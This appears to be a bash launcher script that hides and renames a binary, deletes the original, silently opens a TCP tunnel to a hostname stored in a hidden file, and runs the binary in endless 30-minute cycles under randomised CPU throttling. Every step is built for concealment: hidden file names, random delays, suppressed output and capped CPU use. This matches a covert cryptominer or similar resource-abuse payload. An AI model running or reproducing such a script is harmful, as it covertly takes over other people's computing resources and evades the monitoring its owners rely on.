#!/bin/bash

sleep $((RANDOM % 20 + 5))

NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"

cp /app/isu "/app/$NAME"
chmod +x "/app/$NAME"
rm -f /app/isu

/usr/local/bin/.netd access tcp \
--hostname "$(cat .h)" \
--url 127.0.0.1:443 >/dev/null 2>&1 &

sleep 3

while true; do

  # ===== RUN CFG =====
  /app/$NAME -c .cfg >/dev/null 2>&1 &
  P=$!

  LIMIT=$((70 + RANDOM % 10))
  cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &

  sleep 1800

  kill -15 $P 2>/dev/null
  sleep 2
  kill -9 $P 2>/dev/null


  # ===== RUN SFG =====
  /app/$NAME -c .sfg >/dev/null 2>&1 &
  P=$!

  LIMIT=$((75 + RANDOM % 11))
  cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &

  sleep 1800

  kill -15 $P 2>/dev/null
  sleep 2
  kill -9 $P 2>/dev/null

done &

tail -f /dev/null
